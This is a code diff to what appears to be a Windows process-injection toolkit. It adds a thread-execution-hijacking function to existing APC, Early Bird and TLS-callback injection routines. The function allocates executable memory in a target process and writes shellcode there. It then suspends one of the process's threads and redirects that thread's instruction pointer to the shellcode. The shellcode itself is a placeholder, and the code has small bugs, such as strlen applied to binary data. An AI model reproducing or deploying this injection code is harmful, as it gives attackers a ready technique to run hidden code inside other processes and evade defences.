@@ -20,7 +20,7 @@ DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName);
 DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName);
 DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName);
 DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName , WCHAR* ExecutablePath );
-
+DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName);
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
 
@@ -257,5 +257,92 @@ DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName, WCHAR* Executa
 		Status = -1;
 	}
 	else Status = 0;
+
 	return Status;
+}
+
+DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName) {
+	HANDLE hProcess = NULL;
+	HANDLE hThread = NULL;
+	DWORD Status = NULL;
+	LPVOID ShelCodeAddress = NULL;
+	DWORD BytesWritten;
+	BYTE ShellCode[] = { 0xAA,0xbb,0xcc,0x00 };
+	BYTE* ShellCode1 = NULL;//= ReadDataFromFile(ShellCodeFileName);
+	if (!ShellCode) {
+		return -1;
+	}
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+	if (!hProcess) {
+		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
+		return -1;
+	}
+
+	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (!ShelCodeAddress) {
+		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
+		return -1;
+	}
+	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
+	if (!Status) {
+		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
+		return -1;
+	}
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+	CONTEXT ThreadContext;
+
+	memset(&ThreadContext, 0, sizeof(CONTEXT));
+	ThreadContext.ContextFlags = CONTEXT_ALL;
+
+	if (Thread32First(snapshot, &threadEntry)) {
+		do {
+			if (threadEntry.th32OwnerProcessID == PID ) {
+
+				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
+				if (!hThread) {
+					printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
+					continue;
+				}
+				
+				Status = SuspendThread(hThread);
+				if (Status ==-1) {
+					printf("Failed to Suspend Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
+					CloseHandle(hThread);
+					continue;
+				}
+				
+				if (GetThreadContext(hThread, &ThreadContext))
+				{
+					printf("ShellCode addr  %p", ShelCodeAddress);
+#if _WIN64			
+					ThreadContext.Rip = (DWORD64)ShelCodeAddress;
+#else
+					ThreadContext.Eip = (DWORD64)ShelCodeAddress;
+#endif
+					if (!SetThreadContext(hThread, &ThreadContext)) {
+						printf("Failed to Set Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
+						CloseHandle(hThread);
+						continue;
+					}
+					Status = ResumeThread(hThread);
+					if (Status == -1) {
+						printf("Failed to Resume Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
+						CloseHandle(hThread);
+						continue;
+					}
+					CloseHandle(hThread);
+					return 0;
+				}
+
+				printf("Failed to Get Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
+				CloseHandle(hThread);
+			}
+			
+		} while (Thread32Next(snapshot, &threadEntry));
+	}
+
+	return -1;
 }
